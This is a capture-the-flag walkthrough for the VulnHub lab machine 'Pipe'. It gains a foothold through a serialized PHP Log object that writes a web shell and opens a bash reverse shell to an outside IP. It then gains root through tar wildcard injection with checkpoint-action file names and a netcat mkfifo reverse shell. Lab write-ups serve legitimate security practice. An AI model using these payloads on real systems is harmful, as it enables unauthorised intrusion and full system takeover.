## Pipe

https://www.vulnhub.com/entry/devrandom-pipe,124/

### www-data

To access index.php, we can insert a non-existent method to see the content:
```
DUDY /index.php HTTP/1.1
```

These are the params on POST index.php:
```
O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The Treachery of Images";}
```

Enumerate directories:
```
/scriptz
/scriptz/log.php.BAK
/scriptz/php.js
```

This is log.php:
```php
<?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this->filename = '';
	$this->data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";
	$now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this->data';
        eval("\$str = \"$str\";");
        echo $str;
    }

    public function __destruct()
    {
	file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}
?>
```

We can create our file to create the object to test:
```php
<?php
class Log
{
    public $filename;
    public $data;

    public function __construct($filename, $data)
    {
        $this->filename = $filename;
	$this->data = $data;
    }
}

$logObject = new Log("/var/www/html/scriptz/test.txt", "This is a test");

echo(serialize($logObject));

# Result
O:3:"Log":2:{s:8:"filename";s:30:"/var/www/html/scriptz/test.txt";s:4:"data";s:14:"This is a test";}
```

To get a reverse shell:
```php
# Remember to use backslash to escape the quotation marks used in the command inside the php used to print the payload
O:3:"Log":2:{s:8:"filename";s:29:"/var/www/html/scriptz/rev.php";s:4:"data";s:73:"<?php system("bash -c 'bash -i >& /dev/tcp/192.168.1.125/1337 0>&1'"); ?>";} 
```

<br>

### Privilege Escalation
Crontab:
```
* * * * * root /root/create_backup.sh
*/5 * * * * root /usr/bin/compress.sh
```

We read compress.sh and see it's using tar on all files inside /home/rene/backup/ and we can write inside this directory.
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 192.168.1.125 3333 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
